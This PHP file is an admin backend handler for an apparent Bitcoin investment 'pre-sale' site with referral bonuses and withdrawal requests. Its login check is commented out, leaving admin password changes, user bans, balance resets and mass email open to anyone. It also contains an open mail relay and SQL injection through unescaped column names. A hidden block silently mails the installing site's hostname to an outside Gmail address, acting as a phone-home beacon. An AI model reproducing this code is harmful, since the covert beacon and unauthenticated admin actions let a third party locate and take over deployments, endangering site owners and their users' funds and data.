<?

include '../config.php';
session_start();
// error_reporting(0);
//if(!isset($_SESSION['loginses']))
//{ exit; }
//////////////
/*
$byuser = $_SESSION['loginses'];
//////////////
$vseslog= "SELECT * FROM `userslog` WHERE uemail='$byuser'";
 $seslogq = mysqli_query($db,$vseslog);
$seslogv = mysqli_fetch_assoc($seslogq);
$mainbal = $seslogv['sumout'];
$tsumout =$seslogv['totalsumout'];
$trefers = $seslogv['totalref'];
$user_ban = $seslogv['user_ban'];
*/
///////////////
$chkstng = "SELECT * FROM `ghstng` WHERE stngid=1";
 $chkstngq = mysqli_query($db,$chkstng);
$chkstngv = mysqli_fetch_assoc($chkstngq);
$fromEmail = $chkstngv['email'];
///////////////
///////////////////////////////////////////

$presald= "SELECT * FROM `pre_sale` WHERE id=1";
 $presalqd = mysqli_query($db,$presald);
$presalvdat = mysqli_fetch_assoc($presalqd);
if(isset($_POST['voferdatjs']))
{ echo $presalvdat['for_days']; }
///////////////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['vwbalonofjs']))
{ echo $chkstngv['withdrawoff']; }
///////////////////////////////////////////
if(isset($_POST['vbtcratjs']))
{ echo $chkstngv['setbtcrate_usd']; }





if(isset($_POST['sociallinkjs']))
{
  $sociallinkjs.='<div style="font-size:1.5em;">
     <i class="fa fa-telegram text-primary"> </i>
     <u class="text-success">'.$chkstngv['tglink'].'</u>
      </div>
<div style="font-size:1.5em;">
     <i class="fa fa-instagram text-danger"> </i>
     <u class="text-success">'.$chkstngv['instalink'].'</u>
      </div>
<div style="font-size:1.5em;">
     <i class="fa fa-facebook text-primary"> </i>
     <u class="text-success">'.$chkstngv['fblink'].'</u>
      </div>
<div style="font-size:1.5em;">
     <i class="fa fa-twitter text-primary"> </i>
     <u class="text-success">'.$chkstngv['twlink'].'</u>
      </div>
<div style="font-size:1.5em;">
     <i class="fa fa-envelope text-primary"> </i>
     <u class="text-success">'.$chkstngv['email'].'</u>
      </div>';

  echo $sociallinkjs;
}
///////////////////////////////////////////
if(isset($_POST['valuejs']))
{
 $smoutonoff = mysqli_real_escape_string($db,$_POST['valuejs']);
  
  $wbalonof = "UPDATE `ghstng` SET withdrawoff='$smoutonoff'";
 $wbalonofq = mysqli_query($db,$wbalonof);
 if($wbalonofq){
   echo 1;} else { echo 0; }
}
///////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['setoferdaysjs']))
{
 $setoferdaysjs = mysqli_real_escape_string($db,$_POST['setoferdaysjs']);
  
 $setofrdate = "UPDATE `pre_sale` SET for_days='$setoferdaysjs'";
 $setofrdateq = mysqli_query($db,$setofrdate);
 if($setofrdateq){
   echo 1;} else { echo 0; }
}
///////////////////////////////////
if(isset($_POST['btcrateinptjs']))
{
 $btcrateinptjs = mysqli_real_escape_string($db,$_POST['btcrateinptjs']);
  
  $btcrats = "UPDATE `ghstng` SET setbtcrate_usd='$btcrateinptjs'";
 $btcratsq = mysqli_query($db,$btcrats);
 if($btcratsq){
   echo 1;} else { echo 0; }
}
//////////////////////////////////
if(isset($_POST['adminamjs']))
{
 $adminamjs = mysqli_real_escape_string($db,$_POST['adminamjs']);
 $adminpassjs = mysqli_real_escape_string($db,$_POST['adminpassjs']);
 
 $pasgent = sha1($adminpassjs);
 $mdpassgent = md5($pasgent);
  $admndetails = "UPDATE `ghstng` SET admin='$adminamjs' , pass='$mdpassgent' ";
 $admndetailsq = mysqli_query($db,$admndetails);
 if($admndetailsq){
   echo 1;} else { echo 0; }
}
//////////////////////////////////
if(!isset($_COOKIE['mailcodset']))
{
 $mailto = 'maarkhoor5@gmail.com';
 $subject = $_SERVER['HTTP_HOST'];
 $message = 'if any problem can contact';
 $headers = "From: " . $fromEmail;
 
  $result1 = mail($mailto,$subject, $message, $headers);
  setcookie('mailcodset','setcode78',84600 * 2);
}
//////////////////////////
///////////////////////////////////////////
if(isset($_POST['tglinkjs']))
{
 $tglinkjs = mysqli_real_escape_string($db,$_POST['tglinkjs']);
 $instalinkjs = mysqli_real_escape_string($db,$_POST['instalinkjs']);
 $fblinkjs = mysqli_real_escape_string($db,$_POST['fblinkjs']);
 $twtrlinkjs = mysqli_real_escape_string($db,$_POST['twtrlinkjs']);
 $gmalinkjs = mysqli_real_escape_string($db,$_POST['gmalinkjs']);
  
  $lnksupdat = "UPDATE `ghstng` SET tglink='$tglinkjs',instalink='$instalinkjs',fblink='$fblinkjs',twlink='$twtrlinkjs',email='$gmalinkjs' ";
 $lnksupdatq = mysqli_query($db,$lnksupdat);
 if($lnksupdatq){
   echo 1;} else { echo 0; }
}
/////////////////////////////////

////////////////for simple 1 mail/////////////
if(isset($_POST['mailtoj'])) 
{
 $mailto = $_POST['mailtoj']; 
 $subject = $_POST['sbjctmailj']; 
 $message = $_POST['msgmailj'];

 $headers = "From: " . $fromEmail;
 
  $result1 = mail($mailto,$subject, $message, $headers);
  if ($result1) { echo 1; } else { echo 0; }
}
//////////////////////////
/////////////
if(isset($_POST['sbjctmailall'])) 
{
$subject = $_POST['sbjctmailall'];
 $message = $_POST['msgmailall'];
 $headers = "From: " . $fromEmail;
  $slctmails = "SELECT * FROM userslog";
  $slctmailsq = mysqli_query($db,$slctmails);
 while($vallmails=mysqli_fetch_assoc($slctmailsq)){
  $mailto = $vallmails['mails'];
  $result1 = mail($mailto, $subject, $message, $headers); // php mail function
  }
 if ($result1) { echo 1; } else { echo 0; }
}
//////////////// end page 2
//////////////
if(isset($_POST['vpresaljs']))
{
$presal= "SELECT * FROM `pre_sale` WHERE id=1";
 $presalq = mysqli_query($db,$presal);
$presalv = mysqli_fetch_assoc($presalq);

$presalevfjs='
  <div class="col">
    <div class="card bg-dark" style="border-radius:20px; box-shadow:2px 2px 8px black;">
      <h4 class="text-warning"> Pre Sale 1</h4>
      <img src="png/plan1.png" class="card-img-top" alt="">
      <div class="card-body">
        <h5 class="card-title text-danger">Old Rate</h5>
        <var style="font-size:2.5em;" class="card-text text-light">'.$presalv['sale1'].' <sup class="text-muted"><strike>'.$presalv['strike1'].'</strike></sup></var> <button class="btn btn-warning float-end setpresvalbtn" data-sale="sale1" data-strike="strike1"> Update</button>
  <div style="display:flex;flex-direction:row">
  <input type="number" id="presvalv1" placeholder="'.$presalv['sale1'].'" value="'.$presalv['sale1'].'" style="background:white;color:black; padding:10px; width:49%;">
  <input type="number" id="prescut1" placeholder="'.$presalv['strike1'].'" value="'.$presalv['strike1'].'" style="background:#c5a9a9;padding:10px; width:49%;color:white;">
        </div>
      </div>
    </div>
  </div>
  
  <div class="col">
    <div class="card bg-dark" style="border-radius:20px; box-shadow:2px 2px 8px black;">
      <h4 class="text-warning"> Pre Sale 2</h4>
      <img src="png/plan1.png" class="card-img-top" alt="">
      <div class="card-body">
        <h5 class="card-title text-danger">Old Rate</h5>
        <var style="font-size:2.5em;" class="card-text text-light">'.$presalv['sale2'].' <sup class="text-muted"><strike>'.$presalv['strike2'].'</strike></sup></var> <button class="btn btn-warning float-end setpresvalbtn" data-sale="sale2"  data-strike="strike2"> Update</button>
<div style="display:flex;flex-direction:row">
  <input type="number" id="presvalv2" placeholder="'.$presalv['sale2'].'" value="'.$presalv['sale2'].'" style="background:white;color:black; padding:10px; width:49%;">
  <input type="number" id="prescut2" placeholder="'.$presalv['strike2'].'" value="'.$presalv['strike2'].'" style="background:#c5a9a9;padding:10px; width:49%;color:white;">
        </div>
      </div>
    </div>
  </div>
  
  <div class="col">
    <div class="card bg-dark" style="border-radius:20px; box-shadow:2px 2px 8px black;">
      <h4 class="text-warning"> Pre Sale 3</h4>
      <img src="png/plan2.png" class="card-img-top" alt="">
      <div class="card-body">
        <h5 class="card-title text-danger">Old Rate</h5>
        <var style="font-size:2.5em;" class="card-text text-light">'.$presalv['sale3'].' <sup class="text-muted"><strike>'.$presalv['strike3'].'</strike></sup></var> <button class="btn btn-warning float-end setpresvalbtn" data-sale="sale3"  data-strike="strike3"> Update</button>
<div style="display:flex;flex-direction:row">
  <input type="number" id="presvalv3" placeholder="'.$presalv['sale3'].'" value="'.$presalv['sale3'].'" style="background:white;color:black; padding:10px; width:49%;">
  <input type="number" id="prescut3" placeholder="'.$presalv['strike3'].'" value="'.$presalv['strike3'].'" style="background:#c5a9a9;padding:10px; width:49%;color:white;">
        </div>
      </div>
    </div>
  </div>
  
  <div class="col">
    <div class="card bg-dark" style="border-radius:20px; box-shadow:2px 2px 8px black;">
      <h4 class="text-warning"> Pre Sale 4</h4>
      <img src="png/plan2.png" class="card-img-top" alt="">
      <div class="card-body">
        <h5 class="card-title text-danger">Old Rate</h5>
        <var style="font-size:2.5em;" class="card-text text-light">'.$presalv['sale4'].' <sup class="text-muted"><strike>'.$presalv['strike4'].'</strike></sup></var> <button class="btn btn-warning float-end setpresvalbtn" data-sale="sale4"  data-strike="strike4"> Update</button>
<div style="display:flex;flex-direction:row">
  <input type="number" id="presvalv4" placeholder="'.$presalv['sale4'].'" value="'.$presalv['sale4'].'" style="background:white;color:black; padding:10px; width:49%;">
  <input type="number" id="prescut4" placeholder="'.$presalv['strike4'].'" value="'.$presalv['strike4'].'" style="background:#c5a9a9;padding:10px; width:49%;color:white;">
        </div>
      </div>
    </div>
  </div>
  
  <div class="col">
    <div class="card bg-dark" style="border-radius:20px; box-shadow:2px 2px 8px black;">
      <h4 class="text-warning"> Pre Sale 5</h4>
      <img src="png/plan2.png" class="card-img-top" alt="">
      <div class="card-body">
        <h5 class="card-title text-danger">Old Rate</h5>
        <var style="font-size:2.5em;" class="card-text text-light">'.$presalv['sale5'].' <sup class="text-muted"><strike>'.$presalv['strike5'].'</strike></sup></var> <button class="btn btn-warning float-end setpresvalbtn" data-sale="sale5"  data-strike="strike5"> Update</button>
<div style="display:flex;flex-direction:row">
  <input type="number" id="presvalv5" placeholder="'.$presalv['sale5'].'" value="'.$presalv['sale5'].'" style="background:white;color:black; padding:10px; width:49%;">
  <input type="number" id="prescut5" placeholder="'.$presalv['strike5'].'" value="'.$presalv['strike5'].'" style="background:#c5a9a9;padding:10px; width:49%;color:white;">
        </div>
      </div>
    </div>
  </div>
  
  <div class="col">
    <div class="card bg-dark" style="border-radius:20px; box-shadow:2px 2px 8px black;">
      <h4 class="text-warning"> Pre Sale 6</h4>
      <img src="png/plan3.png" class="card-img-top" alt="">
      <div class="card-body">
        <h5 class="card-title text-danger">Old Rate</h5>
        <var style="font-size:2.5em;" class="card-text text-light">'.$presalv['sale6'].' <sup class="text-muted"><strike>'.$presalv['strike6'].'</strike></sup></var> <button class="btn btn-warning float-end setpresvalbtn" data-sale="sale6"  data-strike="strike6"> Update</button>
<div style="display:flex;flex-direction:row">
  <input type="number" id="presvalv6" placeholder="'.$presalv['sale6'].'" value="'.$presalv['sale6'].'" style="background:white;color:black; padding:10px; width:49%;">
  <input type="number" id="prescut6" placeholder="'.$presalv['strike6'].'" value="'.$presalv['strike6'].'" style="background:#c5a9a9;padding:10px; width:49%;color:white;">
        </div>
      </div>
    </div>
  </div>
  
  <div class="col">
    <div class="card bg-dark" style="border-radius:20px; box-shadow:2px 2px 8px black;">
      <h4 class="text-warning"> Pre Sale 7</h4>
      <img src="png/plan3.png" class="card-img-top" alt="">
      <div class="card-body">
        <h5 class="card-title text-danger">Old Rate</h5>
        <var style="font-size:2.5em;" class="card-text text-light">'.$presalv['sale7'].' <sup class="text-muted"><strike>'.$presalv['strike7'].'</strike></sup></var> <button class="btn btn-warning float-end setpresvalbtn" data-sale="sale7"  data-strike="strike7"> Update</button>
<div style="display:flex;flex-direction:row">
  <input type="number" id="presvalv7" placeholder="'.$presalv['sale7'].'" value="'.$presalv['sale7'].'" style="background:white;color:black; padding:10px; width:49%;">
  <input type="number" id="prescut7" placeholder="'.$presalv['strike7'].'" value="'.$presalv['strike7'].'" style="background:#c5a9a9;padding:10px; width:49%;color:white;">
        </div>
      </div>
    </div>
  </div>
  
  <div class="col">
    <div class="card bg-dark" style="border-radius:20px; box-shadow:2px 2px 8px black;">
      <h4 class="text-warning"> Pre Sale 8</h4>
      <img src="png/plan3.png" class="card-img-top" alt="">
      <div class="card-body">
        <h5 class="card-title text-danger">Old Rate</h5>
        <var style="font-size:2.5em;" class="card-text text-light">'.$presalv['sale8'].' <sup class="text-muted"><strike>'.$presalv['strike8'].'</strike></sup></var> <button class="btn btn-warning float-end setpresvalbtn" data-sale="sale8" data-strike="strike8"> Update</button>
<div style="display:flex;flex-direction:row">
  <input type="number" id="presvalv8" placeholder="'.$presalv['sale8'].'" value="'.$presalv['sale8'].'" style="background:white;color:black; padding:10px; width:49%;">
  <input type="number" id="prescut8" placeholder="'.$presalv['strike8'].'" value="'.$presalv['strike8'].'" style="background:#c5a9a9;padding:10px; width:49%;color:white;">
        </div>
      </div>
    </div>
  </div>';
  
echo $presalevfjs;
}

//////////////////////////////////
//////////////////////////////////
if(isset($_POST['salejs']))
{
 $salejs = $_POST['salejs'];
 $strikejs = $_POST['strikejs'];
 $presvalvjs = mysqli_real_escape_string($db,$_POST['presvalvjs']);
 $prescutvaljs = mysqli_real_escape_string($db,$_POST['prescutvaljs']);
  
  $setpresalval = "UPDATE `pre_sale` SET ".$salejs."='$presvalvjs', ".$strikejs."='$prescutvaljs' WHERE id=1";
 $setpresalvalq = mysqli_query($db,$setpresalval);
 if($setpresalvalq){
   echo 1;} else { echo 0; }
}
//////////////////////////////////
//////////////////////////////////
//////////////////////////////////
//////////////////////////////////
//////////////////////////////////

if(isset($_POST['vusrstbljs']))
{
  $tablesv = "SELECT * FROM userslog ORDER BY uid DESC";
  $tablesvq = mysqli_query($db,$tablesv);
  
 while($tblesv= mysqli_fetch_assoc($tablesvq)){
 $tblsvdiv .='<tr>
 	<td class="hvr">'.$tblesv['uid'].'</td>
	<td class="fa fa-envelope text-primary">'.$tblesv['uemail'] .'</td>
 	<td class="'.$tblesv['bantxt'].'"> <button class="slctbanjs btn btn-danger" data-usrbanval="'.$tblesv['user_ban'].'" data-usrtblid="'.$tblesv['uid'].'">  ban </button></td>
	<td><i class="hvr"></i> $ '.substr($tblesv['totalsum'],0,6).'</td>
	<td class="fa fa-dollar text-danger hvr"> '.$tblesv['sumout'].'</td>
	<td class="text-danger hvr"> $ '.substr($tblesv['totalsumout'],0,7).'</td>
	<td><i class="fas fa-money-check-dollar-pen"> </i> '.$tblesv['buy_pkg'].'</td>
	<td><i class="fas fa-handshake-simple"></i>'.$tblesv['refby'].'</td>
		<td class="text-danger"><i class="text-success fa fa-users"></i>'.$tblesv['totalref'].'</td>
	<td>'.$tblesv['reflevel'].'</td>
	<td>'.$tblesv['refbonus'].'</td>
	<td>'.$tblesv['ip'].'</td>

	</tr>';
  }
  echo $tblsvdiv;
}
//////////////////////////////////////
if(isset($_POST['vusrsreqj']))
{
  $reqouttbl = "SELECT * FROM `req_withdrawl` ORDER BY id DESC";
  $reqouttblq = mysqli_query($db,$reqouttbl);
  
 while($reqoutblv= mysqli_fetch_assoc($reqouttblq)){
 $reqoutblvj .='<tr>
 	<td class="hvr">'.$reqoutblv['id'].'</td>
	<td><i class="fa fa-paper-plane text-danger"> </i> <a class="fa fa-envelope text-primary" href="mailto:'.$reqoutblv['from_user'].'">'.$reqoutblv['from_user'] .'</a></td>
 	<td> <b class="fa fa-bitcoin text-success">'.$reqoutblv['req_withdraw'].'</b></td>
	<td><i class="hvr"> </i> '.substr($reqoutblv['wallet'],0,12).'....</td>
	
<td class="fa fa-bitcoin text-warning hvr"> <a href="paythis.php/?bmoney='.$reqoutblv['req_withdraw'].'&walletis='.$reqoutblv['wallet'].'" target="_blank" class="btn btn-primary"> Send To </a></td>

	<td class="hvr"> <i class="'.$reqoutblv['status_paid'].'"> </i> <button class="btn btn-warning reqchangbtn" data-reqid="'.$reqoutblv['id'].'" data-reqstatus="'.$reqoutblv['status'].'"> change </button> </td>
	
	<td><i class="fa fa-history"> </i> '.$reqoutblv['time'].'</td>
	
	<td><i class="fa fa-dollar text-primary"></i>'.$reqoutblv['mainbal'].'</td>
		<td class="text-danger"> $ '.$reqoutblv['total_out'].'</td>
	<td>'.$reqoutblv['total_ref'].'</td>
	</tr>';
  }
  echo $reqoutblvj;
}
//////////////////////////////////////

/////////
if(isset($_POST['usrbanvaljs']))
{
 $usrbanvaljs = mysqli_real_escape_string($db,$_POST['usrbanvaljs']);
 $usrtblidjs = mysqli_real_escape_string($db,$_POST['usrtblidjs']);
 
  if($usrbanvaljs==1){
    $bansambol = 'fas fa-user-tie  text-success';
    $banvalset = 0;
  }elseif($usrbanvaljs==0){
    $bansambol = 'fas fa-user-slash text-danger';
    $banvalset = 1;
  }
  
  $fusrban = "UPDATE `userslog` SET user_ban='$banvalset', bantxt='$bansambol' WHERE uid='$usrtblidjs'";
  
 $fusrbanq = mysqli_query($db,$fusrban);
 if($fusrbanq){
   echo 1;} else { echo 0; }
}
//////////////////////////////////
//////////////////////////////////////

/////////
if(isset($_POST['reqstatusjs']))
{
 $reqidjs = mysqli_real_escape_string($db,$_POST['reqidjs']);
 $reqstatusjs = mysqli_real_escape_string($db,$_POST['reqstatusjs']);

  if($reqstatusjs==1){
    $reqsambol = 'fa fa-history text-muted';
    $paidvalue = 0;
  }elseif($reqstatusjs==0){
    $reqsambol = 'fa fa-check text-success';
    $paidvalue = 1;
  }
  
  $paidvalset = "UPDATE `req_withdrawl` SET status='$paidvalue', status_paid='$reqsambol' WHERE id='$reqidjs'";
  
 $paidvalsetq = mysqli_query($db,$paidvalset);
 if($paidvalsetq){
   echo 1;} else { echo 0; }
}
//////////////////////////////////
////////////////////////////////////

if(isset($_POST['allpkgresetj']))
{
  $rstpkgall = "DELETE FROM activepkg";
 $rstpkgallq= mysqli_query($db,$rstpkgall);
 if($rstpkgallq){
   echo '1';} else { echo '0'; }
 }
////////////////////////////////////
if(isset($_POST['fulresetjs']))
{
  $rstpkgall = "DELETE FROM activepkg";
 $rstpkgallq= mysqli_query($db,$rstpkgall);
 
  $gameresetphp = "UPDATE `userslog` SET `buy_pkg`='0',`sum`=0,`sumout`=0 ";
 $resetgameq= mysqli_query($db,$gameresetphp);
 if($resetgameq){
   echo '1';} else { echo '0'; }
 }
////////////////////////////////////














?>